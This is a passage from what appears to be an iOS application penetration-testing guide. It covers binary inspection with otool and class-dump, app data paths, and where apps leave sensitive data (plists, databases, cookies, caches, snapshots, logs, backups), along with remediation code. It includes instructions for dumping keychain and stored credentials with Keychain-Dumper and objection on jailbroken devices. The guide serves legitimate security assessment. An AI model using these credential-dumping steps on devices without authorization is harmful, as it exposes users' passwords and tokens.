device\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_random\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_srand\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_rand\"\n‚Äã\n# On linux\ngrep\n-iER\n\"_random\"\ngrep\n-iER\n\"_srand\"\ngrep\n-iER\n\"_rand\"\nInsecure ‚ÄòMalloc‚Äô Function\n# On the iOS device\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_malloc\"\n‚Äã\n# On linux\ngrep\n-iER\n\"_malloc\"\nInsecure and Vulnerable Functions\n# On the iOS device\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_gets\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_memcpy\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_strncpy\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_strlen\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_vsnprintf\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_sscanf\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_strtok\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_alloca\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_sprintf\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_printf\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_vsprintf\"\n‚Äã\n# On linux\ngrep\n-R\n\"_gets\"\ngrep\n-iER\n\"_memcpy\"\ngrep\n-iER\n\"_strncpy\"\ngrep\n-iER\n\"_strlen\"\ngrep\n-iER\n\"_vsnprintf\"\ngrep\n-iER\n\"_sscanf\"\ngrep\n-iER\n\"_strtok\"\ngrep\n-iER\n\"_alloca\"\ngrep\n-iER\n\"_sprintf\"\ngrep\n-iER\n\"_printf\"\ngrep\n-iER\n\"_vsprintf\"\nBasic Dynamic Analysis\nCheck out the dynamic analysis that\nMobSF\nperform. You will need to navigate through the different views and interact with them but it will be hooking several classes on doing other things and will prepare a report once you are done.\nListing Installed Apps\nWhen targeting apps that are installed on the device, you'll first have to figure out the correct bundle identifier of the application you want to analyze. You can use\nfrida-ps -Uai\nto get all apps (\n-a\n) currently installed (\n-i\n) on the connected USB device (\n-U\n):\n$ frida-ps\n-Uai\nPID  Name                 Identifier\n----  -------------------  -----------------------------------------\n6847\nCalendar             com.apple.mobilecal\n6815\nMail                 com.apple.mobilemail\n-  App Store            com.apple.AppStore\n-  Apple Store          com.apple.store.Jolly\n-  Calculator           com.apple.calculator\n-  Camera               com.apple.camera\n-  iGoat-Swift          OWASP.iGoat-Swift\nBasic Enumeration & Hooking\nLearn how to\nenumerate the components of the application\nand how to easily\nhook methods and classes\nwith objection:\niOS Hooking With Objection\nIPA Structure\n.ipa\nfiles are\nzipped\npackages\n, so you can change the extension to\n.zip\nand\ndecompress\nthem. A\ncomplete\npackaged\napp ready to be installed is commonly referred to as a\nBundle\n.\nAfter decompressing them you should see\n<NAME>.app\n, a zipped archive that contains the rest of the resources.\nInfo.plist\n: A file that contains some of the application specific configurations.\n_CodeSignature/\ncontains a plist file with a signature over all files in the bundle.\nAssets.car\n: Another zipped archive that contains assets (icons).\nFrameworks/\ncontains the app native libraries as .dylib or .framework files.\nPlugIns/\nmay contain app extensions as .appex files (not present in the example).\n‚Äã\nCore Data\n: It is used to save your application‚Äôs permanent data for offline use, to cache temporary data, and to add undo functionality to your app on a single device. To sync data across multiple devices in a single iCloud account, Core Data automatically mirrors your schema to a CloudKit container.\n‚Äã\nPkgInfo\n: The\nPkgInfo\nfile is an alternate way to specify the type and creator codes of your application or bundle.\nen.lproj, fr.proj, Base.lproj\n: Are the language packs that contains resources for those specific languages, and a default resource in case a language isn' t supported.\nThere are multiple ways to define the UI in an iOS application:\nstoryboard\n,\nnib\nor\nxib\nfiles.\nInfo.plist\nThe information property list or\nInfo.plist\nis the main source of information for an iOS app. It consists of a structured file containing\nkey-value\npairs describing essential configuration information about the app. Actually, all bundled executables (app extensions, frameworks and apps) are\nexpected to have\nan\nInfo.plist\nfile. You can find all possible keys in the\nApple Developer Documentation\n.\nThe file might be formatted in\nXML or binary (bplist)\n. You can\nconvert it to XML\nformat with one simple command:\nOn macOS with\nplutil\n, which is a tool that comes natively with macOS 10.2 and above versions (no official online documentation is currently available):\n$ plutil\n-convert\nxml1 Info.plist\nOn Linux:\n$\napt\ninstall\nlibplist-utils\n$ plistutil\n-i\nInfo.plist\n-o\nInfo_xml.plist\nHere's a non-exhaustive list of some info and the corresponding keywords that you can easily search for in the\nInfo.plist\nfile by just inspecting the file or by using\ngrep -i <keyword> Info.plist\n:\nApp permissions Purpose Strings:\nUsageDescription\nCustom URL schemes:\nCFBundleURLTypes\nExported/imported\ncustom document types\n:\nUTExportedTypeDeclarations\n/\nUTImportedTypeDeclarations\nApp Transport Security (ATS) configuration:\nNSAppTransportSecurity\nPlease refer to the mentioned chapters to learn more about how to test each of these points.\nData Paths\nOn iOS,\nsystem applications can be found in the\n/Applications\ndirectory while\nuser-installed\napps are available under\n/private/var/containers/\n. However, finding the right folder just by navigating the file system is not a trivial task as\nevery app gets a random 128-bit UUID\n(Universal Unique Identifier) assigned for its directory names.\nIn order to easily obtain the installation directory information for user-installed apps you can use\nobjection's command\nenv\nwill also show you all the directory information of the app:\nOWASP.iGoat-Swift on\n(\niPhone:\n11.1\n.2\n)\n[\nusb\n]\n# env\n‚Äã\nName               Path\n-----------------  -------------------------------------------------------------------------------------------\nBundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app\nCachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches\nDocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents\nLibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library\nYou could also search for the app name inside\n/private/var/containers\n:\nfind\n/private/var/containers\n-name\n\"Progname*\"\nOr using\nps\nand\nlsof\n:\nps\n-ef\n|\ngrep\n-i\n<\napp-name\n>\nlsof\n-p\n<\npid\n>\n|\ngrep\n-i\n\"/containers\"\n|\nhead\n-n\n1\nAs you can see, apps have two main locations:\nThe\nBundle\ndirectory\n(\n/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/\n).\nThe\nData directory\n(\n/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/\n).\nThese folders contain information that must be examined closely during application security assessments (for example when analyzing the stored data for sensitive data).\nBundle directory:\nAppName.app\nThis is the Application Bundle as seen before in the IPA, it contains essential application data, static content as well as the application's compiled binary.\nThis directory is visible to users, but\nusers can't write to it\n.\nContent in this directory is\nnot backed up\n.\nThe contents of this folder are used to\nvalidate the code signature\n.\nData directory:\nDocuments/\nContains all the user-generated data. The application end user initiates the creation of this data.\nVisible to users and\nusers can write to it\n.\nContent in this directory is\nbacked up\n.\nThe app can disable paths by setting\nNSURLIsExcludedFromBackupKey\n.\nLibrary/\nContains all\nfiles that aren't user-specific\n, such as\ncaches\n,\npreferences\n,\ncookies\n, and property list (plist) configuration files.\niOS apps usually use the\nApplication Support\nand\nCaches\nsubdirectories, but the app can create custom subdirectories.\nLibrary/Caches/\nContains\nsemi-persistent cached files.\nInvisible to users and\nusers can't write to it\n.\nContent in this directory is\nnot backed up\n.\nThe OS may delete this directory's files automatically when the app is not running and storage space is running low.\nLibrary/Application Support/\nContains\npersistent\nfiles\nnecessary for running the app.\nInvisible\nto\nusers\nand users can't write to it.\nContent in this directory is\nbacked\nup\n.\nThe app can disable paths by setting\nNSURLIsExcludedFromBackupKey\n.\nLibrary/Preferences/\nUsed for storing properties that can\npersist even after an application is restarted\n.\nInformation is saved, unencrypted, inside the application sandbox in a plist file called [BUNDLE_ID].plist.\nAll the key/value pairs stored using\nNSUserDefaults\ncan be found in this file.\ntmp/\nUse this directory to write\ntemporary files\nthat do not need to persist between app launches.\nContains non-persistent cached files.\nInvisible\nto users.\nContent in this directory is not backed up.\nThe OS may delete this directory's files automatically when the app is not running and storage space is running low.\nLet's take a closer look at iGoat-Swift's Application Bundle (.app) directory inside the Bundle directory (\n/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app\n):\nOWASP.iGoat-Swift on\n(\niPhone:\n11.1\n.2\n)\n[\nusb\n]\n# ls\nNSFileType      Perms  NSFileProtection\n..\n.  Name\n------------  -------  ------------------\n..\n.  --------------------------------------\nRegular\n420\nNone\n..\n.  rutger.html\nRegular\n420\nNone\n..\n.  mansi.html\nRegular\n420\nNone\n..\n.  splash.html\nRegular\n420\nNone\n..\n.  about.html\n‚Äã\nRegular\n420\nNone\n..\n.  LICENSE.txt\nRegular\n420\nNone\n..\n.  Sentinel.txt\nRegular\n420\nNone\n..\n.  README.txt\nBinary Reversing\nInside the\n<application-name>.app\nfolder you will find a binary file called\n<application-name>\n. This is the file that will be\nexecuted\n. You can perform a basic inspection of the binary with the tool\notool\n:\notool\n-Vh\nDVIA-v2\n#Check some compilation attributes\nmagic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags\nMH_MAGIC_64    ARM64        ALL  0x00     EXECUTE\n65\n7112\nNOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE\n‚Äã\notool\n-L\nDVIA-v2\n#Get third party libraries\nDVIA-v2:\n/usr/lib/libc++.1.dylib\n(\ncompatibility version\n1.0\n.0, current version\n400.9\n.1\n)\n/usr/lib/libsqlite3.dylib\n(\ncompatibility version\n9.0\n.0, current version\n274.6\n.0\n)\n/usr/lib/libz.1.dylib\n(\ncompatibility version\n1.0\n.0, current version\n1.2\n.11\n)\n@rpath/Bolts.framework/Bolts\n(\ncompatibility version\n1.0\n.0, current version\n1.0\n.0\n)\n[..\n.\n]\nCheck if the app is encrypted\nSee if there is any output for:\notool\n-l\n<\napp-binary\n>\n|\ngrep\n-A\n4\nLC_ENCRYPTION_INFO\nDisassembling the binary\nDisassemble the text section:\notool\n-tV\nDVIA-v2\nDVIA-v2:\n(\n__TEXT,__text\n)\nsection\n+\n[\nDDLog initialize\n]\n:\n0000000100004ab8    sub    sp, sp,\n#0x60\n0000000100004abc    stp    x29, x30,\n[\nsp,\n#0x50]   ; Latency: 6\n0000000100004ac0\nadd\nx29, sp,\n#0x50\n0000000100004ac4    sub    x8, x29,\n#0x10\n0000000100004ac8    mov    x9,\n#0x0\n0000000100004acc    adrp    x10,\n1098\n;\n0x10044e000\n0000000100004ad0\nadd\nx10, x10,\n#0x268\nTo print the\nObjective-C segment\nof the sample application one can use:\notool\n-oV\nDVIA-v2\nDVIA-v2:\nContents of\n(\n__DATA,__objc_classlist\n)\nsection\n00000001003dd5b8 0x1004423d0 _OBJC_CLASS_\n$_DDLog\nisa        0x1004423a8 _OBJC_METACLASS_\n$_DDLog\nsuperclass 0x0 _OBJC_CLASS_\n$_NSObject\ncache      0x0 __objc_empty_cache\nvtable     0x0\ndata       0x1003de748\nflags          0x80\ninstanceStart\n8\nIn order to obtain a more compact Objective-C code you can use\nclass-dump\n:\nclass-dump some-app\n//\n//     Generated by class-dump\n3.5\n(\n64\nbit\n)\n.\n//\n//     class-dump is Copyright\n(\nC\n)\n1997\n-1998,\n2000\n-2001,\n2004\n-2013 by Steve Nygard.\n//\n‚Äã\n#pragma mark Named Structures\n‚Äã\nstruct CGPoint\n{\ndouble _field1\n;\ndouble _field2\n;\n};\n‚Äã\nstruct CGRect\n{\nstruct CGPoint _field1\n;\nstruct CGSize _field2\n;\n};\n‚Äã\nstruct CGSize\n{\ndouble _field1\n;\ndouble _field2\n;\n};\nHowever, the best options to disassemble the binary are:\nHopper\nand\nIDA\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nData Storage\nTo learn about how iOS stores data in the device read this page:\niOS Basics\nThe following places to store information should be checked\nright after installing the application\n,\nafter checking all the functionalities\nof the application and even after\nlogin out from one user and login into a different one\n.\nThe goal is to find\nunprotected sensitive information\nof the application (passwords, tokens), of the current user and of previously logged users.\nPlist\nplist\nfiles are structured XML files that\ncontains key-value pairs\n. It's a way to store persistent data, so sometimes you may find\nsensitive information in these files\n. It's recommended to check these files after installing the app and after using intensively it to see if new data is written.\nThe most common way to persist data in plist files is through the usage of\nNSUserDefaults\n. This plist file is saved inside the app sandbox in\nLibrary/Preferences/<appBundleID>.plist\nThe\nNSUserDefaults\nclass provides a programmatic interface for interacting with the default system. The default system allows an application to customize its behaviour according to\nuser preferences\n. Data saved by\nNSUserDefaults\ncan be viewed in the application bundle. This class stores\ndata\nin a\nplist\nfile\n, but it's meant to be used with small amounts of data.\nThis data cannot be longer accessed directly via a trusted computer, but can be accessed performing a\nbackup\n.\nYou can\ndump\nthe information saved using\nNSUserDefaults\nusing objection's\nios nsuserdefaults get\nTo find all the plist of used by the application you can access to\n/private/var/mobile/Containers/Data/Application/{APPID}\nand run:\nfind\n./\n-name\n\"*.plist\"\nThe file might be formatted in\nXML or binary (bplist)\n. You can\nconvert it to XML\nformat with one simple command:\nOn macOS with\nplutil\n, which is a tool that comes natively with macOS 10.2 and above versions (no official online documentation is currently available):\n$ plutil\n-convert\nxml1 Info.plist\nOn Linux:\n$\napt\ninstall\nlibplist-utils\n$ plistutil\n-i\nInfo.plist\n-o\nInfo_xml.plist\nOn an objection's session:\nios plist\ncat\n/private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist\nCore Data\n‚Äã\nCore Data\nis a framework for managing the model layer of objects in your application.\nCore Data can use SQLite as its persistent store\n, but the framework itself is not a database.\nCoreData does not encrypt it's data by default. However, an additional encryption layer can be added to CoreData. See the\nGitHub Repo\nfor more details.\nYou can find the SQLite Core Data information of an application in the path\n/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support\nIf you can open the SQLite and access sensitive information, then you found a miss-configuration.\nCode from iGoat\n-\n(\nvoid\n)\nstoreDetails\n{\nAppDelegate\n*\nappDelegate\n=\n(\nAppDelegate\n*\n)(\nUIApplication\n.\nsharedApplication\n.\ndelegate\n);\n‚Äã\nNSManagedObjectContext\n*\ncontext\n=\n[\nappDelegate managedObjectContext\n];\n‚Äã\nUser\n*\nuser\n=\n[\nself\nfetchUser\n];\nif\n(\nuser\n)\n{\nreturn\n;\n}\nuser\n=\n[\nNSEntityDescription insertNewObjectForEntityForName\n:\n@\"User\"\ninManagedObjectContext\n:\ncontext\n];\nuser\n.\nemail\n=\nCoreDataEmail\n;\nuser\n.\npassword\n=\nCoreDataPassword\n;\nNSError\n*\nerror\n;\nif\n(\n!\n[\ncontext save\n:\n&\nerror\n])\n{\nNSLog\n(\n@\"Error in saving data: %@\"\n,\n[\nerror localizedDescription\n]);\n‚Äã\n}\nelse\n{\nNSLog\n(\n@\"data stored in core data\"\n);\n}\n}\nYapDatabase\n‚Äã\nYapDatabase\nis a key/value store built on top of SQLite.\nAs the Yap databases are sqlite databases you can find them using the purposed commend in the previous section.\nOther SQLite Databases\nIt's common for applications to create their own sqlite database. They may be\nstoring\nsensitive\ndata\non them and leaving it unencrypted. Therefore, it's always interesting to check every database inside the applications directory. Therefore go to the application directory where the data is saved (\n/private/var/mobile/Containers/Data/Application/{APPID}\n)\nfind\n./\n-name\n\"*.sqlite\"\n-or\n-name\n\"*.db\"\nFirebase Real-Time Databases\nIt can be leveraged by application developers to s\ntore and sync data with a NoSQL cloud-hosted database\n. The data is stored as JSON and is synchronized in real-time to every connected client and also remains available even when the application goes offline.\nYou can find how to check for misconfigured Firebase databases here:\nFirebase Database\nRealm databases\n‚Äã\nRealm Objective-C\nand\nRealm Swift\naren't supplied by Apple, but they are still worth noting. They\nstore everything unencrypted, unless the configuration has encryption enabled\n.\nYou can find this databases in\n/private/var/mobile/Containers/Data/Application/{APPID}\niPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root\n# ls\ndefault.realm  default.realm.lock  default.realm.management/  default.realm.note\n|\n‚Äã\n$\nfind\n./\n-name\n\"*.realm*\"\nYou can use the tool\nRealm Studio\nto open this database files.\nThe following example demonstrates how to use encryption with a Realm database:\n// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server\nlet\nconfig\n=\nRealm\n.\nConfiguration\n(\nencryptionKey\n:\ngetKey\n())\ndo\n{\nlet\nrealm\n=\ntry\nRealm\n(\nconfiguration\n:\nconfig\n)\n// Use the Realm as normal\n}\ncatch\nlet\nerror\nas\nNSError\n{\n// If the encryption key is wrong, `error` will say that it's an invalid database\nfatalError\n(\n\"Error opening realm:\n\\(\nerror\n)\n\"\n)\n}\nCouchbase Lite Databases\n‚Äã\nCouchbase Lite\nis a lightweight, embedded, document-oriented (NoSQL) database engine that can be synced. It compiles natively for iOS and macOS.\nCheck for possible couchbase databases in\n/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/\nCookies\niOS store the cookies of the apps in the\nLibrary/Cookies/cookies.binarycookies\ninside each apps folder. However, developers sometimes decide to save them in the\nkeychain\nas the mentioned\ncookie file can be accessed in backups\n.\nTo inspect the cookies file you can use\nthis python script\nor use objection's\nios cookies get\n.\nYou can also use objection to\nconvert these files to a JSON format and inspect the data.\n..\n.itudehacks.DVIAswiftv2.develop on\n(\niPhone:\n13.2\n.3\n)\n[\nusb\n]\n# ios cookies get --json\n[\n{\n\"domain\"\n:\n\"highaltitudehacks.com\"\n,\n\"expiresDate\"\n:\n\"2051-09-15 07:46:43 +0000\"\n,\n\"isHTTPOnly\"\n:\n\"false\"\n,\n\"isSecure\"\n:\n\"false\"\n,\n\"name\"\n:\n\"username\"\n,\n\"path\"\n:\n\"/\"\n,\n\"value\"\n:\n\"admin123\"\n,\n\"version\"\n:\n\"0\"\n}\n]\nCache\nBy default NSURLSession stores data, such as\nHTTP requests and responses in the Cache.db\ndatabase. This database can contain\nsensitive data\n, if tokens, usernames or any other sensitive information has been cached. To find the cached information open the data directory of the app (\n/var/mobile/Containers/Data/Application/<UUID>\n) and go to\n/Library/Caches/<Bundle Identifier>\n. The\nWebKit cache is also being stored in the Cache.db\nfile.\nObjection\ncan open and interact with the database with the command\nsqlite connect Cache.db\n, as it is a n\normal SQLite database\n.\nIt is\nrecommended to disable Caching this data\n, as it may contain sensitive information in the request or response. The following list below shows different ways of achieving this:\n1.\nIt is recommended to remove Cached responses after logout. This can be done with the provided method by Apple called\nremoveAllCachedResponses\nYou can call this method as follows:\nURLCache.shared.removeAllCachedResponses()\nThis method will remove all cached requests and responses from Cache.db file.\n2.\nIf you don't need to use the advantage of cookies it would be recommended to just use the\n.ephemeral\nconfiguration property of URLSession, which will disable saving cookies and Caches.\n‚Äã\nApple documentation\n:\nAn ephemeral session configuration object is similar to a default session configuration (see default), except that the corresponding session object doesn‚Äôt store caches, credential stores, or any session-related data to disk. Instead, session-related data is stored in RAM. The only time an ephemeral session writes data to disk is when you tell it to write the contents of a URL to a file.\n3.\nCache can be also disabled by setting the Cache Policy to\n.notAllowed\n. It will disable storing Cache in any fashion, either in memory or on disk.\nSnapshots\nWhenever you press the home button, iOS\ntakes a snapshot of the current screen\nto be able to do the transition to the application on a much smoother way. However, if\nsensitive\ndata\nis present in the current screen, it will be\nsaved\nin the\nimage\n(which\npersists\nacross\nreboots\n). These are the snapshots that you can also access double tapping the home screen to switch between apps.\nUnless the iPhone is jailbroken, the\nattacker\nneeds to have\naccess\nto the\ndevice\nunblocked\nto see these screenshots. By default the last snapshot is stored in the application's sandbox in\nLibrary/Caches/Snapshots/\nor\nLibrary/SplashBoard/Snapshots\nfolder (the trusted computers can' t access the filesystem from iOX 7.0).\nOnce way to prevent this bad behaviour is to put a blank screen or remove the sensitive data before taking the snapshot using the\nApplicationDidEnterBackground()\nfunction.\nThe following is a sample remediation method that will set a default screenshot.\nSwift:\nprivate\nvar\nbackgroundImage\n:\nUIImageView\n?\n‚Äã\nfunc\napplicationDidEnterBackground\n(\n_\napplication\n:\nUIApplication\n)\n{\nlet\nmyBanner\n=\nUIImageView\n(\nimage\n:\n#imageLiteral\n(\nresourceName\n:\n\"overlayImage\"\n))\nmyBanner\n.\nframe\n=\nUIScreen\n.\nmain\n.\nbounds\nbackgroundImage\n=\nmyBanner\nwindow\n?\n.\naddSubview\n(\nmyBanner\n)\n}\n‚Äã\nfunc\napplicationWillEnterForeground\n(\n_\napplication\n:\nUIApplication\n)\n{\nbackgroundImage\n?\n.\nremoveFromSuperview\n()\n}\nObjective-C:\n@property (UIImageView *)backgroundImage;\n‚Äã\n- (void)applicationDidEnterBackground:(UIApplication *)application {\nUIImageView *myBanner = [[UIImageView alloc] initWithImage:@\"overlayImage.png\"];\nself.backgroundImage = myBanner;\nself.backgroundImage.bounds = UIScreen.mainScreen.bounds;\n[self.window addSubview:myBanner];\n}\n‚Äã\n- (void)applicationWillEnterForeground:(UIApplication *)application {\n[self.backgroundImage removeFromSuperview];\n}\nThis sets the background image to\noverlayImage.png\nwhenever the application is backgrounded. It prevents sensitive data leaks because\noverlayImage.png\nwill always override the current view.\nKeychain\nTools like\nKeychain-Dumper\ncan be used to dump the keychain (the dive must be jailbroken).\nYou can also use\nios keychain dump\nfrom\nObjection\n.\nNSURLCredential\nNSURLCredential\nis the perfect class to\nstore username and password in the keychain\n. No need to bother with NSUserDefaults nor any keychain wrapper.\nOnce the user is logged in, you can store his username and password to the keychain:\nNSURLCredential\n*\ncredential\n;\n‚Äã\ncredential\n=\n[\nNSURLCredential\ncredentialWithUser\n:\nusername password\n:\npassword persistence\n:\nNSURLCredentialPersistencePermanent\n];\n[[\nNSURLCredentialStorage\nsharedCredentialStorage\n]\nsetCredential\n:\ncredential forProtectionSpace\n:\nself\n.\nloginProtectionSpace\n];\nYou can use\nObjection's\nios nsurlcredentialstorage dump\nto dump these secrets.\nCustom Keyboards/Keyboard Cache\nFrom iOS 8.0 Apple allows to install custom extensions for iOS like custom keyboards.\nThe installed keyboards can be managed via\nSettings\n>\nGeneral\n>\nKeyboard\n>\nKeyboards\nCustom keyboards can be used to\nsniff\nthe\nkeystrokes\nand send them to the attacker server. However, note that\ncustom keyboards requiring networking connectivity will be notified to the user.\nAlso, the\nuser can switch to a different\n(more trusted)\nkeyboard\nfor introducing the credentials.\nMoreover,\napplications can prevent its users from using custom keyboards\nwithin the app (or at least for sensitive parts of the app).\nIt's recommended to not allow third party keyboards if you consider the users won't need them\nNote that because of auto-correct and auto-suggestions, the default iOS keyboard will capture and store each non-standard word word in a cache file if the attribute\nsecuretTextEntry\nis not set to\ntrue\nor if\nautoCorrectionType\nis not set to\nUITextAutoCorrectionTypeNo.\nBy default the keyboards\nstore this cache\ninside the applications sandbox in\nLibrary/Keyboard/{locale}-dynamic-text.dat\nfile or in\n/private/var/mobile/Library/Keyboard/dynamic-text.dat\n. However, it might be saving the dateaelsewhere.\nIt's possible to reset the cache in\nSettings\n>\nGeneral\n>\nReset\n>\nReset Keyboard Dictionary\nTherefore,\ncheck always these files\nand search for possible\nsensitive\ninformation\n.\nIntercepting the network traffic\nis another way to check if the custom keyboard is sending keystroked to a remote server.\nThe\nUITextInputTraits protocol\nis used for keyboard caching. The UITextField, UITextView, and UISearchBar classes automatically support this protocol and it offers the following properties:\nvar autocorrectionType: UITextAutocorrectionType\ndetermines whether autocorrection is enabled during typing. When autocorrection is enabled, the text object tracks unknown words and suggests suitable replacements, replacing the typed text automatically unless the user overrides the replacement. The default value of this property is\nUITextAutocorrectionTypeDefault\n, which for most input methods enables autocorrection.\nvar secureTextEntry: BOOL\ndetermines whether text copying and text caching are disabled and hides the text being entered for\nUITextField\n. The default value of this property is\nNO\n.\nTo identify this behaviour in the code:\nSearch through the source code for similar implementations, such as\ntextObject\n.\nautocorrectionType\n=\nUITextAutocorrectionTypeNo\n;\ntextObject\n.\nsecureTextEntry\n=\nYES\n;\nOpen xib and storyboard files in the\nInterface Builder\nof Xcode and verify the states of\nSecure Text Entry\nand\nCorrection\nin the\nAttributes Inspector\nfor the appropriate object.\nThe application must prevent the caching of sensitive information entered into text fields. You can prevent caching by disabling it programmatically, using the\ntextObject.autocorrectionType = UITextAutocorrectionTypeNo\ndirective in the desired UITextFields, UITextViews, and UISearchBars. For data that should be masked, such as PINs and passwords, set\ntextObject.secureTextEntry\nto\nYES\n.\nUITextField\n*\ntextField\n=\n[\n[\nUITextField alloc\n]\ninitWithFrame\n:\nframe\n];\ntextField\n.\nautocorrectionType\n=\nUITextAutocorrectionTypeNo\n;\nLogs\nThe most common ways to debug code is using logging, and the application\nmay print sensitive information inside the logs\n.\nIn iOS version 6 and below, logs were world readable (a malicious app could read logs from other apps and extract sensitive information from there).\nNowadays, apps can only access their own logs\n.\nHowever, an\nattacker\nwith\nphysical\naccess\nto an\nunlocked\ndevice can connect it to a computer and\nread the logs\n(note that the logs written to disk by an app aren't removed if the app ins uninstalled).\nIt's recommended to\nnavigate through all the screens\nof the app and\ninteract\nwith\nevery\nUI element and\nfunctionality\nof and provide input text in all text fields and\nreview the logs\nlooking for\nsensitive\ninformation\nexposed.\nUse the following keywords to check the app's source code for predefined and custom logging statements:\nFor predefined and built-in functions:\nNSLog\nNSAssert\nNSCAssert\nfprintf\nFor custom functions:\nLogging\nLogfile\nMonitoring System Logs\nMany apps log informative (and potentially sensitive) messages to the console log. The log also contains crash reports and other useful information.\nYou can use these tools:\nidevice_id\n--list\n# To find the device ID\nidevicesyslog\n-u\n<\nid\n>\n(\n|\ngrep\n<\napp\n>\n)\n# To get the device logs\nYou can collect console logs through the Xcode\nDevices\nwindow as follows:\n1.\nLaunch Xcode.\n2.\nConnect your device to your host computer.\n3.\nChoose\nWindow\n->\nDevices and Simulators\n.\n4.\nClick on your connected iOS device in the left section of the Devices window.\n5.\nReproduce the problem.\n6.\nClick on the\nOpen Console\nbutton located in the upper right-hand area of the Devices window to view the console logs on a separate window.\nYou can also connect to the device shell as explained in Accessing the Device Shell, install\nsocat\nvia\napt-get\nand run the following command:\niPhone:~ root\n# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock\n‚Äã\n========================\nASL is here to serve you\n>\nwatch\nOK\n‚Äã\nJun\n7\n13\n:42:14 iPhone chmod\n[\n9705\n]\n<\nNotice\n>\n: MS:Notice: Injecting:\n(\nnull\n)\n[\nchmod\n]\n(\n1556.00\n)\nJun\n7\n13\n:42:14 iPhone readlink\n[\n9706\n]\n<\nNotice\n>\n: MS:Notice: Injecting:\n(\nnull\n)\n[\nreadlink\n]\n(\n1556.00\n)\nJun\n7\n13\n:42:14 iPhone rm\n[\n9707\n]\n<\nNotice\n>\n: MS:Notice: Injecting:\n(\nnull\n)\n[\nrm\n]\n(\n1556.00\n)\nJun\n7\n13\n:42:14 iPhone touch\n[\n9708\n]\n<\nNotice\n>\n: MS:Notice: Injecting:\n(\nnull\n)\n[\ntouch\n]\n(\n1556.00\n)\n..\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nBackups\niOS includes auto-backup features that create copies of the data stored on the device. You can\nmake iOS backups\nfrom your host computer by using iTunes (till macOS Catalina) or Finder (from macOS Catalina onwards), or via the iCloud backup feature. In both cases, the backup includes nearly all data stored on the iOS device except highly sensitive data such as Apple Pay information and Touch ID settings.\nSince iOS backs up installed apps and their data, an obvious concern is whether\nsensitive user data\nstored by the app might\nunintentionally leak through the backup\n. Another concern, though less obvious, is whether\nsensitive configuration settings used to protect data or restrict app functionality could be tampered to change app behaviour after restoring a modified backup\n. Both concerns are valid and these vulnerabilities have proven to exist in a vast number of apps today.\nA backup of a device on which a mobile application has been installed will include all subdirectories (except for\nLibrary/Caches/\n) and files in the\napp's private directory\n.\nTherefore,\navoid storing sensitive data in plaintext within any of the files or folders that are in the app's private directory or subdirectories\n.\nAlthough all the files in\nDocuments/\nand\nLibrary/Application Support/\nare always backed up by default, you can\nexclude files from the backup\nby calling\nNSURL setResourceValue:forKey:error:\nwith the\nNSURLIsExcludedFromBackupKey\nkey.\nYou can use the\nNSURLIsExcludedFromBackupKey\nand\nCFURLIsExcludedFromBackupKey\nfile system properties to exclude files and directories from backups.\nTherefore when checking the backup of an application you should check if\nany sensitive information\nis accessible and if you can\nmodify any sensitive behaviour\nof the application by\nmodifying some setting of the backup\nand restoring the backup\nHow to test\nStart by\ncreating a backup of the device\n(you can do it using Finder) and finding where is the backup stored. The official Apple documentation will help you to\nlocate backups of your iPhone, iPad, and iPod touch\n.\nOnce you have found the backup of the device (\n/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}\n) you can start looking for sensitive information using grep for example, or using tools like\niMazing\n).\nTo identify if a backup is encrypted, you can check the key named \"IsEncrypted\" from the file \"Manifest.plist\", located at the root of the backup directory. The following example shows a configuration indicating that the backup is encrypted:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nplist\nPUBLIC\n\"-//Apple//DTD PLIST 